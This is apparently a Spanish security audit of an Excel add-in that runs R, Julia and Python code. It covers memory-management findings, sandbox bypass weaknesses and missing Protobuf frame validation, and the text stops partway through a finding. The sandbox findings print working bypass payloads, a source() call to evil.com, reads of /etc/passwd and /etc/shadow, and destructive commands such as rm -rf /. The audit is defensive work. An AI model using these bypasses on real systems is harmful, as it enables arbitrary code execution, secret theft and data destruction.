- **Descripción:** La función `WindowsCPToUTF8` usa buffers estáticos que crecen según demanda (patrón "grow-only"). Cuando el buffer actual es insuficiente, se libera con `delete[]` y se reasigna con el nuevo tamaño. Aunque estos buffers nunca se liberan al final del proceso (son estáticos), este es un patrón intencional de optimización para evitar asignaciones repetidas en una función llamada frecuentemente (conversión de encoding para cada mensaje de consola de R). El crecimiento es controlado por chunks de 256 bytes.

---

## Análisis de Patrones de Gestión de Memoria

### Resumen por módulo

| Módulo | Smart Pointers | Raw new/delete | RAII Handles | Evaluación |
|--------|---------------|----------------|--------------|------------|
| Core/ | ✅ Extensivo (unique_ptr, shared_ptr) | Mínimo (1 caso, correctamente liberado) | ✅ UniqueHandle | Excelente |
| Common/ | ✅ Presente (BackgroundConnector) | Moderado (ViewerManager, pipe) — todos liberados | ✅ UniqueHandle | Muy bueno |
| ControlR/ | ❌ No usa smart pointers | Extensivo — todos correctamente liberados | ❌ Raw HANDLE | Bueno |
| ControlJulia/ | ❌ No usa smart pointers | Moderado — **1 fuga (stdio_pipes)** | ❌ Raw HANDLE | Bueno con defecto menor |
| ControlPython/ | ❌ No usa smart pointers | Moderado — **1 fuga (stdio_pipes)** | ❌ Raw HANDLE | Bueno con defecto menor |
| Ribbon/ | N/A | Sin asignaciones dinámicas propias | N/A | N/A |

### Observaciones sobre el diseño

1. **Evolución del código**: Se observa una clara evolución en las prácticas de gestión de memoria. El Core (código más reciente/refactorizado) usa smart pointers extensivamente, mientras que los procesos hijos (ControlR, ControlJulia, ControlPython) usan raw `new`/`delete` — probablemente código más antiguo que no ha sido modernizado.

2. **Protobuf memory**: Los objetos Protobuf (`CallResponse`, `CompositeFunctionCall`) se asignan con `new` y se liberan con `delete` correctamente en todos los casos. Protobuf gestiona internamente la memoria de sus campos (strings, sub-mensajes) — no se requiere liberación manual de campos individuales.

3. **Patrón de ownership transfer**: El proyecto usa consistentemente el patrón "allocate-pass-free" para comunicación entre hilos (PostThreadMessage con punteros). Todos los puntos de consumo liberan correctamente la memoria.

4. **Ausencia de memory pools**: No se usan memory pools ni allocators personalizados. Dado el perfil de uso (add-in de Excel con operaciones esporádicas), esto es apropiado — la complejidad adicional no se justifica.

---

## Nota sobre Exclusiones

Los siguientes archivos fueron excluidos del análisis:
- `Build/_deps/` — Código de terceros (Protocol Buffers, Google Test, WebView2 SDK).
- `Common/json11/json11.cpp` — Librería JSON de Dropbox (MIT). Usa `new` internamente pero gestiona su propia memoria.
- `PB/variable.pb.cc` — Código generado por protoc. La gestión de memoria es responsabilidad de la librería Protobuf.
- `tests/` — Código de test. Las asignaciones en tests son aceptables (el framework GTest gestiona el ciclo de vida).
- `Include/` — Mock headers para testing, no código de producción.

---

## Nota sobre Asignaciones Intencionales sin Liberación

Las siguientes asignaciones **no se liberan intencionalmente** y no constituyen fugas de memoria:

| Archivo | Asignación | Justificación |
|---------|-----------|---------------|
| ControlR/src/gdi_graphics_device.cc:211 | `new CLSID(...)` (static singleton) | Singleton de proceso — se asigna una sola vez y persiste hasta que el proceso termina. El OS libera la memoria. |
| ControlR/src/convert.cc:59,62 | `new char[chunk]`, `new WCHAR[chunk]` (static) | Buffers de conversión de encoding reutilizados durante toda la vida del proceso. Optimización intencional para evitar asignaciones repetidas. |

Estos patrones son estándar en programación de sistemas Windows donde ciertos recursos tienen la misma vida útil que el proceso.


---
---

# Hallazgos de Seguridad — Evaluación de Mecanismos de Sandbox y Bypass

**Tarea:** 2.6 Evaluar mecanismos de Sandbox y detectar posibles bypass  
**Fecha:** 2026-01-XX  
**Alcance:** Common/SandboxVerifier.cc, Common/SecurityService.cc, Core/src/basic_functions.cc, Core/src/REPLLanguageAccessorImpl.cc, Common/REPLBridge.cc, Common/AutoLoader.cc, startup/  
**Extensiones:** .cc, .h, .r, .jl, .py

---

## Resumen del Análisis

### Arquitectura del Sandbox

| Componente | Función | Ubicación |
|------------|---------|-----------|
| `SandboxVerifier` | Validación de código por patrones (blocklist) | Common/SandboxVerifier.cc |
| `SecurityService` | Verificación de integridad SHA-256 de scripts | Common/SecurityService.cc |
| `ConfigService::IsSandboxEnabled()` | Toggle on/off del sandbox via config JSON | Common/ConfigService.h:84-89 |
| Startup scripts | Inicialización de entornos R/Julia/Python | startup/ |

### Modelo de Seguridad

El sandbox de NEVEN es una **capa de defensa en profundidad** basada en **blocklist de patrones** (no allowlist). Se aplica a código ingresado directamente desde celdas de Excel via `=NEVEN.r("...")`, `=NEVEN.j("...")` y `=NEVEN.p("...")`. El propio código fuente documenta explícitamente sus limitaciones:

> *"Pattern-based blocking can be bypassed by sufficiently motivated attackers. This layer raises the bar against casual/accidental misuse and malicious workbooks, but is NOT a full sandbox."*

### Enfoque del Sandbox

- **Tipo:** Blocklist (lista negra de patrones)
- **Aplicación:** Solo en `RJ_Exec_Generic` (ejecución directa de código desde celdas)
- **Bypass por diseño:** Funciones registradas (`=R.Func()`) NO pasan por el sandbox
- **Configurable:** Se puede desactivar completamente via `"sandboxEnabled": false` en neven-config.json

### Rutas de Ejecución Analizadas

| Ruta | Sandbox aplicado | Archivo |
|------|-----------------|---------|
| `=NEVEN.r("code")` / `=NEVEN.j("code")` | ✅ Sí | Core/src/basic_functions.cc:151 |
| `=R.Func(args)` (funciones registradas) | ❌ No (por diseño) | Core/src/basic_functions.cc:101 |
| REPL Console (repl-exec) | ❌ No | Common/REPLBridge.cc → REPLLanguageAccessorImpl.cc |
| AutoLoader (scripts de usuario) | ❌ No | Common/AutoLoader.cc:68,83 |
| `ReadSourceFile` (carga de funciones) | ❌ No | Core/src/basic_functions.cc:1074 |
| Startup scripts | ❌ No (código confiable) | startup/ |

---

## Hallazgos

---

### [SEC-CRI-003] Bypass de sandbox via REPL Console — ejecución sin restricción

- **Archivo:** Common/REPLBridge.cc:40-73, Core/src/REPLLanguageAccessorImpl.cc:38-65
- **Línea:** REPLBridge.cc:40 (action == "repl-exec"), REPLLanguageAccessorImpl.cc:47 (ExecuteShellCommand)
- **Contexto:**
```cpp
// REPLBridge.cc — recibe código del WebView2 Console
if (action == "repl-exec") {
    std::string language = msg["language"].string_value();
    std::string code = msg["code"].string_value();
    // ... valida que el lenguaje está registrado y conectado ...
    DispatchExec(viewer_id, language, code, request_id);
}

// REPLLanguageAccessorImpl.cc — ejecuta sin sandbox
std::string ExecuteShellCommand(const std::string& language,
                                const std::string& code) const override {
    // Build a Code message — same pattern as RJ_Exec_Generic
    // PERO SIN LLAMAR A SandboxVerifier::ValidateCodeForExecution()
    RJ2XCLBuffers::CallResponse call, response;
    call.set_wait(true);
    auto code_msg = call.mutable_code();
    // ... envía directamente al motor de lenguaje ...
    svc->Call(response, call);
}
```
- **Severidad:** Crítica
- **Categoría:** Seguridad > Bypass de sandbox
- **Descripción:** La ruta de ejecución del REPL Console (`repl-exec`) **no aplica el SandboxVerifier** antes de enviar código al motor de lenguaje. El código fluye directamente desde el WebView2 (Console Electron) → `REPLBridge::DispatchExec()` → `REPLLanguageAccessorImpl::ExecuteShellCommand()` → `LanguageService::Call()` sin ninguna validación de seguridad. Esto permite ejecutar cualquier comando bloqueado por el sandbox (system(), ccall(), eval(), etc.) simplemente usando la consola REPL en lugar de una celda de Excel. Si un atacante puede inyectar mensajes en el WebView2 (via XSS en la Console, que ya tiene `nodeIntegration: true`), puede ejecutar código arbitrario en R/Julia/Python sin restricción.
- **Impacto:** Un atacante con acceso a la Console puede ejecutar `system("rm -rf /")` en R, `run(\`cmd /c del *.*\`)` en Julia, o `os.system("format C:")` en Python sin que el sandbox lo bloquee.
- **Recomendación:**
  1. Aplicar `SandboxVerifier::ValidateCodeForExecution()` en `REPLBridge::DispatchExec()` antes de despachar la ejecución.
  2. Alternativamente, aplicar la validación en `REPLLanguageAccessorImpl::ExecuteShellCommand()`.
  3. Si se desea permitir código sin restricción en el REPL (para usuarios avanzados), implementar un nivel de confianza diferenciado con confirmación explícita del usuario para comandos peligrosos.

---

### [SEC-CRI-004] Bypass de sandbox via AutoLoader — scripts de usuario ejecutados sin validación

- **Archivo:** Common/AutoLoader.cc:67-69, 82-84
- **Línea:** 68 (SourcingRFiles), 83 (SourcingJuliaFiles)
- **Contexto:**
```cpp
void AutoLoader::SourcingRFiles() {
    auto engine = RuntimeLoader::GetInstance().GetEngine(RuntimeLoader::EngineType::R);
    if (!engine) return;
    for (const auto& entry : fs::directory_iterator(m_script_directory)) {
        if (entry.is_regular_file() && entry.path().extension() == ".R") {
            std::string content = ReadFileContent(entry.path().string());
            if (!content.empty()) {
                // NO SANDBOX CHECK — ejecuta directamente
                engine->ExecuteString(content);
            }
        }
    }
}
```
- **Severidad:** Crítica
- **Categoría:** Seguridad > Bypass de sandbox
- **Descripción:** El `AutoLoader` escanea un directorio de usuario configurable (`functionsDirectory` en neven-config.json, típicamente `%USERPROFILE%\Documents\NEVEN\functions`) y ejecuta **todos** los archivos `.R` y `.jl` encontrados directamente en los motores de lenguaje **sin pasar por el SandboxVerifier**. Tampoco se aplica `SecurityService::VerifyScriptIntegrity()` para verificar hashes SHA-256. Un atacante que pueda colocar un archivo `.R` o `.jl` malicioso en el directorio de funciones del usuario (via ingeniería social, malware, o acceso compartido) puede ejecutar código arbitrario la próxima vez que NEVEN se inicialice. El directorio de usuario (`Documents\NEVEN\functions`) tiene permisos de escritura para el usuario actual y potencialmente para otros procesos.
- **Impacto:** Ejecución de código arbitrario al inicio de Excel sin interacción del usuario. Un archivo `malicious.R` con `system("powershell -enc ...")` se ejecutaría automáticamente.
- **Recomendación:**
  1. Aplicar `SandboxVerifier::ValidateCodeForExecution()` al contenido de cada archivo antes de ejecutarlo.
  2. Aplicar `SecurityService::VerifyScriptIntegrity()` para verificar que los archivos no han sido modificados (requiere generar .sha256 al crear/modificar scripts legítimos).
  3. Implementar una allowlist de archivos de función conocidos.
  4. Mostrar un prompt al usuario cuando se detectan archivos nuevos o modificados en el directorio de funciones.

---

### [SEC-CRI-005] Enfoque de blocklist permite bypass por funciones no contempladas

- **Archivo:** Common/SandboxVerifier.cc:70-175
- **Línea:** Toda la sección de patrones bloqueados
- **Contexto:**
```cpp
// R: bloquea system(), system2(), shell(), eval(parse()), do.call(), etc.
// PERO NO bloquea:
//   - get("system") → retorna la función system como objeto
//   - Reduce("+", list(sys, "tem"), accumulate=TRUE) → construye "system"
//   - library() / require() → puede cargar paquetes con funciones peligrosas
//   - writeLines() → puede escribir archivos arbitrarios
//   - readLines() → puede leer archivos sensibles del sistema
//   - source() → puede ejecutar scripts remotos o locales
//   - connections (file(), gzfile()) → acceso a filesystem
//   - Sys.getenv() → lectura de variables de entorno (solo setenv bloqueado)
```
- **Severidad:** Crítica
- **Categoría:** Seguridad > Bypass de sandbox
- **Descripción:** El sandbox usa un enfoque de **blocklist** (lista negra) que solo bloquea patrones específicos conocidos. Esto es fundamentalmente inseguro porque cualquier función no contemplada en la lista puede usarse para evadir las restricciones. Vectores de bypass identificados:

  **R — Bypass confirmados:**
  1. `get("system")("whoami")` — `get()` no está bloqueado y retorna cualquier función por nombre
  2. `do.call(get("system"), list("dir"))` — aunque `do.call(` está bloqueado, `get()` solo no lo está
  3. `source("http://evil.com/payload.R")` — `source()` no está bloqueado, puede cargar scripts remotos
  4. `readLines("/etc/passwd")` — lectura de archivos arbitrarios no bloqueada
  5. `writeLines("malware", "/tmp/evil.sh")` — escritura de archivos no bloqueada
  6. `library(processx); run("cmd")` — cargar paquetes con funciones de ejecución
  7. `Sys.getenv("API_KEY")` — lectura de variables de entorno (solo `Sys.setenv` bloqueado)
  8. `con <- file("/etc/shadow"); readLines(con)` — acceso via connections

  **Julia — Bypass confirmados:**
  1. `Base.invokelatest(getfield(Base, :run), \`whoami\`)` — reflexión no bloqueada (nota: backtick sí está bloqueado, pero `Cmd(["whoami"])` no)
  2. `open("secret.txt") do f; read(f, String); end` — lectura de archivos no bloqueada
  3. `write("evil.jl", "malicious code")` — escritura de archivos no bloqueada
  4. `using Pkg; Pkg.add("Malicious")` — instalación de paquetes no bloqueada
  5. `@eval Main $(Expr(:call, :run, \`cmd\`))` — aunque `eval(` está bloqueado, `@eval` con interpolación compleja podría evadir

  **Python — Bypass confirmados:**
  1. `globals()["__builtins__"]["__import__"]("os").system("cmd")` — acceso via globals/builtins
  2. `open("/etc/passwd").read()` — lectura de archivos no bloqueada
  3. `open("evil.py", "w").write("import os; os.system('cmd')")` — escritura no bloqueada
  4. `type('', (), {"__del__": lambda s: __import__("os").system("cmd")})()` — bypass via metaclases
  5. `[x for x in ().__class__.__bases__[0].__subclasses__() if 'warning' in x.__name__][0]._module.__builtins__['__import__']('os').system('cmd')` — bypass via MRO traversal

- **Recomendación:**
  1. **Migrar a un enfoque de allowlist** donde solo se permiten funciones/operaciones explícitamente aprobadas.
  2. Como medida inmediata, agregar al blocklist: `get(`, `source(`, `readLines(`, `writeLines(`, `file(`, `Sys.getenv(`, `library(`, `require(`, `open(` (Python file), `globals(`, `__class__`, `__bases__`, `__subclasses__`.
  3. Para hardening real, considerar sandboxing a nivel de OS: AppContainer en Windows, restricted tokens, o procesos con integridad baja (Low Integrity Level).
  4. Evaluar el uso de `RestrictedPython` para Python, `RAppArmor` para R, o `SafeREPL` para Julia.

---

### [SEC-CRI-006] Sandbox desactivable via archivo de configuración sin protección

- **Archivo:** Common/ConfigService.h:84-89
- **Línea:** 84-89
- **Contexto:**
```cpp
bool IsSandboxEnabled() const {
    if (config_["NEVEN"]["sandboxEnabled"].is_bool())
        return config_["NEVEN"]["sandboxEnabled"].bool_value();
    return true;  // default: enabled
}
```
```json
// neven-config.json
{
    "NEVEN": {
        "sandboxEnabled": false  // ← desactiva TODA la protección
    }
}
```
- **Severidad:** Crítica
- **Categoría:** Seguridad > Bypass de sandbox
- **Descripción:** El sandbox completo puede desactivarse estableciendo `"sandboxEnabled": false` en `neven-config.json`. El archivo de configuración reside en `C:\NEVEN\neven-config.json` sin protección de integridad ni permisos especiales. Un atacante con acceso de escritura al directorio `C:\NEVEN\` (que tiene permisos estándar de usuario) puede desactivar el sandbox y luego ejecutar código arbitrario desde celdas de Excel. Combinado con un workbook malicioso que primero modifica la configuración (via `writeLines()` en R, que no está bloqueado), se puede desactivar el sandbox en una ejecución y explotarlo en la siguiente. Además, no hay logging ni alerta cuando el sandbox se desactiva.
- **Impacto:** Desactivación completa de todas las protecciones de ejecución de código sin notificación al usuario.
- **Recomendación:**
  1. Proteger el archivo de configuración con permisos restrictivos (solo lectura para el usuario).
  2. Verificar la integridad del archivo de configuración al inicio (hash o firma).
  3. Registrar un log de nivel WARNING cuando el sandbox está desactivado.
  4. Mostrar un indicador visual en Excel (ribbon/status bar) cuando el sandbox está OFF.
  5. Considerar no permitir la desactivación del sandbox via configuración — solo via flag de compilación o variable de entorno administrativa.

---

### [SEC-ALT-006] Verificación de integridad de scripts permisiva — permite ejecución sin hash

- **Archivo:** Common/SecurityService.cc:30-35
- **Línea:** 30-35
- **Contexto:**
```cpp
bool SecurityService::VerifyScriptIntegrity(const std::string& script_path) {
    std::string hash_path = script_path + ".sha256";
    
    std::ifstream hash_file(hash_path);
    if (!hash_file.is_open()) {
        // No hash file — allow execution but log for audit trail
        return true;  // ← PERMITE EJECUCIÓN SIN VERIFICACIÓN
    }
    // ... verifica hash solo si existe el archivo .sha256 ...
}
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Bypass de sandbox
- **Descripción:** `SecurityService::VerifyScriptIntegrity()` retorna `true` (permite ejecución) cuando no existe un archivo `.sha256` correspondiente al script. Esto significa que la verificación de integridad es **opt-in**: solo funciona si alguien ha generado previamente el archivo de hash. Un atacante puede simplemente eliminar el archivo `.sha256` (o agregar un script nuevo sin hash) para evadir la verificación de integridad. Además, los scripts de startup (`startup.r`, `startup.jl`) tienen archivos `.sha256` pero `startup.py` no tiene uno, lo que sugiere aplicación inconsistente.
- **Impacto:** La verificación de integridad no protege contra scripts nuevos o modificados si se elimina el archivo de hash.
- **Recomendación:**
  1. Cambiar el comportamiento por defecto: si no existe `.sha256`, **bloquear** la ejecución (o al menos solicitar confirmación del usuario).
  2. Generar automáticamente archivos `.sha256` cuando se instalan scripts legítimos.
  3. Agregar un archivo `.sha256` para `startup.py`.
  4. Considerar almacenar los hashes en un registro central protegido en lugar de archivos individuales que pueden ser eliminados.

---

### [SEC-ALT-007] Detección de bypass por whitespace-stripping incompleta

- **Archivo:** Common/SandboxVerifier.cc:56-63, 160-165
- **Línea:** 56-63 (StripWhitespace), 160-165 (matching)
- **Contexto:**
```cpp
// StripWhitespace elimina espacios para detectar "sys tem()"
static std::string StripWhitespace(const std::string& s) {
    std::string result;
    for (char c : s) {
        if (!std::isspace(static_cast<unsigned char>(c))) {
            result += c;
        }
    }
    return result;
}

// Matching: busca en AMBAS versiones (original y stripped)
if (lower_code.find(pattern.first) != std::string::npos ||
    stripped_code.find(pattern.first) != std::string::npos) {
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Bypass de sandbox
- **Descripción:** El sandbox intenta prevenir bypass por inserción de whitespace (ej: `"sys tem("`) eliminando espacios antes de buscar patrones. Sin embargo, esta técnica es incompleta:
  1. **Comentarios inline:** `system(/* bypass */"cmd")` — los comentarios no se eliminan, pero el patrón `system(` sigue presente en el código original, así que este caso SÍ se detecta.
  2. **Unicode whitespace:** Solo elimina `std::isspace` (ASCII whitespace). Caracteres Unicode como `\u200B` (zero-width space), `\u00A0` (non-breaking space), o `\uFEFF` (BOM) no se eliminan y podrían insertarse entre caracteres del patrón: `sys\u200Btem(` pasaría el filtro.
  3. **Encoding tricks:** Si el código llega en UTF-8 con caracteres homoglíficos (ej: `ѕystem` con 'ѕ' cirílico U+0455 en lugar de 's' latino), la conversión a lowercase no lo detectaría.
  4. **String concatenation ya detectada parcialmente:** El sandbox detecta `paste()` con fragmentos sospechosos, pero no detecta `sprintf("%s%s", "sys", "tem")` ni `chartr()` ni `intToUtf8()`.
- **Recomendación:**
  1. Extender `StripWhitespace` para eliminar también caracteres Unicode de ancho cero y non-breaking spaces.
  2. Normalizar el código a ASCII antes de la comparación (reemplazar homoglíficos).
  3. Agregar detección de `sprintf`, `chartr`, `intToUtf8`, `rawToChar` como funciones de construcción de strings en R.
  4. Considerar un parser AST en lugar de pattern matching textual para detección más robusta.

---

### [SEC-MED-002] Julia backtick blocking demasiado agresivo — falsos positivos en strings

- **Archivo:** Common/SandboxVerifier.cc:119
- **Línea:** 119
- **Contexto:**
```cpp
// Julia dangerous patterns
{"`", "backtick command literal — shell execution blocked"},
```
- **Severidad:** Media
- **Categoría:** Seguridad > Sandbox — Falso positivo
- **Descripción:** El sandbox bloquea **cualquier** uso del carácter backtick (`` ` ``) en código Julia. Aunque los backticks en Julia crean command literals (`\`ls\``), el carácter también aparece en strings legítimos, documentación, y expresiones regulares. Esto causa falsos positivos que pueden frustrar a usuarios legítimos y motivarlos a desactivar el sandbox completamente. Ejemplo: `println("Use \`help()\` for info")` sería bloqueado incorrectamente.
- **Recomendación:**
  1. Refinar la detección para buscar backticks que forman command literals (par de backticks con contenido entre ellos) en lugar de un solo carácter.
  2. Usar un patrón como `` `[^`]+` `` (regex) para detectar command literals reales.
  3. Excluir backticks dentro de strings (entre comillas dobles).

---

## Hallazgos Positivos (Fortalezas)

### [FOR-SBX-001] Documentación honesta de limitaciones del sandbox

- **Archivo:** Common/SandboxVerifier.cc:1-24 (comentario de cabecera)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Sandbox
- **Descripción:** El código fuente documenta explícitamente que el sandbox es una capa de defensa en profundidad y NO un sandbox completo. Reconoce que "pattern-based blocking can be bypassed by sufficiently motivated attackers" y sugiere "OS-level sandboxing (AppContainer, restricted tokens)" para hardening de producción. Esta transparencia demuestra madurez en el diseño de seguridad y establece expectativas correctas.

### [FOR-SBX-002] Cobertura amplia de patrones peligrosos para los tres lenguajes

- **Archivo:** Common/SandboxVerifier.cc:70-175
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Sandbox
- **Descripción:** El `SandboxVerifier` implementa listas de bloqueo para **tres lenguajes** (R, Julia, Python) cubriendo múltiples categorías de riesgo: ejecución de shell, manipulación de archivos, acceso a red, ejecución de código nativo, construcción dinámica de código, y manipulación de entorno. La cobertura es significativamente más amplia que un bloqueo básico de `system()`.

### [FOR-SBX-003] Detección de bypass por concatenación de strings

- **Archivo:** Common/SandboxVerifier.cc:177-210
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Sandbox
- **Descripción:** El sandbox implementa detección avanzada de intentos de bypass por concatenación de strings: detecta `paste()` con fragmentos sospechosos en R, `$()` con `run`/`ccall` en Julia, y `getattr()` con módulos peligrosos en Python. Esto demuestra conciencia de técnicas de evasión y va más allá de un simple pattern matching.

### [FOR-SBX-004] Normalización case-insensitive y whitespace-stripping

- **Archivo:** Common/SandboxVerifier.cc:56-63, 67-72
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Sandbox
- **Descripción:** El sandbox normaliza el código a lowercase y elimina whitespace antes de buscar patrones, previniendo bypass triviales como `System()`, `SYSTEM()`, o `sys tem()`. La doble verificación (código original + código stripped) asegura que ambas variantes son detectadas.

### [FOR-SBX-005] SecurityService implementa verificación SHA-256 de scripts de startup

- **Archivo:** Common/SecurityService.cc, startup/startup.r.sha256, startup/startup.jl.sha256
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Sandbox
- **Descripción:** El proyecto implementa un mecanismo de verificación de integridad basado en SHA-256 para scripts de startup. Los archivos `startup.r.sha256` y `startup.jl.sha256` contienen hashes que permiten detectar modificaciones no autorizadas a los scripts de inicialización. La implementación usa BCrypt (API nativa de Windows) con RAII wrappers para prevenir fugas de handles.

### [FOR-SBX-006] Sandbox habilitado por defecto — requiere acción explícita para desactivar

- **Archivo:** Common/ConfigService.h:84-89
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Sandbox
- **Descripción:** El método `IsSandboxEnabled()` retorna `true` por defecto cuando la configuración no especifica el campo `sandboxEnabled`. Esto asegura que el sandbox está activo en instalaciones nuevas y que solo se desactiva con una acción deliberada del administrador.

---

## Resumen de Severidades

| ID | Título | Severidad |
|----|--------|-----------|
| SEC-CRI-003 | Bypass via REPL Console sin sandbox | Crítica |
| SEC-CRI-004 | Bypass via AutoLoader sin validación | Crítica |
| SEC-CRI-005 | Blocklist permite bypass por funciones no contempladas | Crítica |
| SEC-CRI-006 | Sandbox desactivable via config sin protección | Crítica |
| SEC-ALT-006 | Verificación de integridad permisiva | Alta |
| SEC-ALT-007 | Detección de bypass por whitespace incompleta | Alta |
| SEC-MED-002 | Backtick blocking demasiado agresivo (falsos positivos) | Media |

## Recomendaciones Priorizadas

1. **[Prioridad 1 — Impacto Crítico]** Aplicar `SandboxVerifier` en la ruta REPL (`REPLBridge::DispatchExec`) para cerrar el bypass más accesible.
2. **[Prioridad 2 — Impacto Crítico]** Aplicar `SandboxVerifier` + `SecurityService::VerifyScriptIntegrity()` en `AutoLoader` antes de ejecutar scripts de usuario.
3. **[Prioridad 3 — Impacto Crítico]** Expandir la blocklist con funciones de bypass conocidas: `get(`, `source(`, `readLines(`, `writeLines(`, `open(`, `globals(`, `__class__`, `Sys.getenv(`, `library(`, `require(`.
4. **[Prioridad 4 — Impacto Alto]** Cambiar `SecurityService::VerifyScriptIntegrity()` para bloquear (o alertar) cuando no existe archivo de hash.
5. **[Prioridad 5 — Largo plazo]** Evaluar migración a sandbox a nivel de OS (AppContainer, Low Integrity Level) para protección real contra atacantes motivados.
6. **[Prioridad 6 — Largo plazo]** Evaluar migración de blocklist a allowlist para el código de celdas de Excel.

---

## Nota sobre el Modelo de Amenaza

El sandbox de NEVEN está diseñado para proteger contra **workbooks maliciosos descargados** que contienen fórmulas con código peligroso (ej: `=NEVEN.r("system('rm -rf /')")`). En este modelo de amenaza, el sandbox es efectivo contra ataques casuales y automatizados. Sin embargo, contra un atacante con conocimiento del sistema (que puede usar `get()`, `source()`, o acceder al REPL), las protecciones son insuficientes. El proyecto reconoce esto explícitamente en su documentación interna.


---
---

# Hallazgos de Seguridad — Validación de Mensajes Protobuf en Named Pipes

**Tarea:** 2.7 Verificar validación de mensajes Protobuf en comunicaciones por Named_Pipe  
**Fecha:** 2026-01-XX  
**Alcance:** Common/message_utilities.cc, Core/src/language_service.cc, ControlR/src/controlr.cc, ControlJulia/src/control_julia.cc, ControlPython/src/control_python.cc  
**Protocolo:** Length-prefix framing (4 bytes int32_t) + Protobuf serialization (variable.proto)

---

## Resumen del Escaneo

### Puntos de deserialización identificados

| Ubicación | Función | Tipo de pipe | Proceso |
|-----------|---------|--------------|---------|
| Common/message_utilities.cc:57 | `Unframe(message, data, len)` | Todas | Compartida |
| Common/message_utilities.cc:61 | `Unframe(message, string)` | Todas | Compartida |
| Core/src/language_service.cc:601-608 | `Unframe` en `Call()` | Primary pipe | XLL (NEVEN.dll) |
| Core/src/language_service.cc:254-258 | `Unframe` en `RunCallbackThread()` | Callback pipe | XLL (NEVEN.dll) |
| ControlR/src/controlr.cc:225 | `Unframe` en `InputStreamRead()` | Primary pipe | ControlR.exe |
| ControlR/src/controlr.cc:155 | `Unframe` en `ConsoleCallback()` | Console pipe | ControlR.exe |
| ControlR/src/controlr.cc:170 | `Unframe` en `Callback()` | Callback pipe | ControlR.exe |
| ControlR/src/controlr.cc:340 | `Unframe` en `ManagementThreadFunction()` | Management pipe | ControlR.exe |
| ControlJulia/src/control_julia.cc:126 | `Unframe` en `Callback()` | Callback pipe | ControlJulia.exe |
| ControlJulia/src/control_julia.cc:232 | `Unframe` en `pipe_loop()` | Primary pipe | ControlJulia.exe |
| ControlJulia/src/control_julia.cc:419 | `Unframe` en `ManagementThreadFunction()` | Management pipe | ControlJulia.exe |
| ControlPython/src/control_python.cc:126 | `Unframe` en `Callback()` | Callback pipe | ControlPython.exe |
| ControlPython/src/control_python.cc:232 | `Unframe` en pipe loop | Primary pipe | ControlPython.exe |
| ControlPython/src/control_python.cc:419 | `Unframe` en `ManagementThreadFunction()` | Management pipe | ControlPython.exe |

### Verificaciones realizadas

| Verificación | Resultado |
|--------------|-----------|
| ¿Tamaño máximo de mensaje validado antes de parsear? | **NO** — No existe límite máximo |
| ¿Longitud del frame validada contra buffer disponible? | **NO** — `bytes` se usa sin validar contra `len` |
| ¿`bytes` validado como no-negativo? | **NO** — `int32_t` puede ser negativo |
| ¿Contenido/tipo validado después de parsear? | **PARCIAL** — Se verifica `operation_case()` pero no se validan campos obligatorios |
| ¿Protocolo de framing (length-prefix) validado? | **NO** — No se verifica que `len >= 4` antes de leer el prefijo |
| ¿Protobuf recursion limit configurado? | **NO** — Se usa el default de Protobuf (100 niveles) |

### Conclusión General

La validación de mensajes Protobuf en las comunicaciones por Named Pipe es **insuficiente**. La función central `MessageUtilities::Unframe()` no valida el prefijo de longitud antes de pasarlo a `ParseFromArray`, lo que permite lecturas fuera de límites con mensajes malformados. No existe un tamaño máximo de mensaje configurable, y la validación post-parseo se limita a un `switch` sobre `operation_case()` sin verificar campos obligatorios ni rangos de valores. Se identificaron **3 hallazgos de severidad Alta** y **1 hallazgo de severidad Media**.

---

## Hallazgos

---

### [SEC-ALT-008] Función Unframe sin validación de longitud del frame — lectura fuera de límites

- **Archivo:** Common/message_utilities.cc
- **Línea:** 56-59
- **Contexto:**
```cpp
bool Unframe(google::protobuf::Message &message, const char *data, uint32_t len) {
    int32_t bytes;
    memcpy(reinterpret_cast<void*>(&bytes), data, sizeof(int32_t));
    return message.ParseFromArray(data + sizeof(int32_t), bytes);
}
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** La función `Unframe` es el punto central de deserialización para **todas** las comunicaciones IPC del proyecto (14+ puntos de llamada entre XLL, ControlR, ControlJulia y ControlPython). Presenta tres vulnerabilidades críticas de validación:
  1. **No valida que `len >= sizeof(int32_t)` (4 bytes)**: Si se recibe un buffer de menos de 4 bytes, `memcpy` lee datos válidos pero `ParseFromArray` recibirá un `bytes` basado en datos parciales/basura.
  2. **No valida que `bytes >= 0`**: El campo `bytes` es `int32_t` (con signo). Un valor negativo (ej: `0xFFFFFFFF` = -1) se pasaría a `ParseFromArray` como un tamaño enorme cuando se interpreta como `size_t`, causando lectura fuera de los límites del buffer.
  3. **No valida que `bytes <= len - sizeof(int32_t)`**: Si el prefijo de longitud indica un mensaje más grande que los datos disponibles en el buffer, `ParseFromArray` leerá memoria más allá del buffer asignado.
  
  En el contexto de Named Pipes en modo `PIPE_READMODE_MESSAGE`, Windows garantiza la integridad del mensaje a nivel de transporte. Sin embargo, si un proceso hijo es comprometido, o si hay un bug en la acumulación de mensajes parciales (ERROR_MORE_DATA), un frame malformado podría causar un crash o lectura de memoria sensible.
- **Impacto:** Crash del proceso (DoS), potencial lectura de memoria adyacente (information disclosure). Afecta tanto al XLL (crash de Excel) como a los procesos hijos.
- **Recomendación:** Agregar validación completa del frame antes de parsear:
```cpp
bool Unframe(google::protobuf::Message &message, const char *data, uint32_t len) {
    if (len < sizeof(int32_t)) return false;
    int32_t bytes;
    memcpy(reinterpret_cast<void*>(&bytes), data, sizeof(int32_t));
    if (bytes < 0 || static_cast<uint32_t>(bytes) > len - sizeof(int32_t)) return false;
    return message.ParseFromArray(data + sizeof(int32_t), bytes);
}
```

---

### [SEC-ALT-009] Ausencia de tamaño máximo de mensaje — posible agotamiento de memoria

- **Archivo:** Common/message_utilities.cc:56-59, Core/src/language_service.cc:630-633
- **Línea:** N/A (ausencia de validación)
- **Contexto:**
```cpp
// message_utilities.cc — no hay límite máximo
bool Unframe(google::protobuf::Message &message, const char *data, uint32_t len) {
    int32_t bytes;
    memcpy(reinterpret_cast<void*>(&bytes), data, sizeof(int32_t));
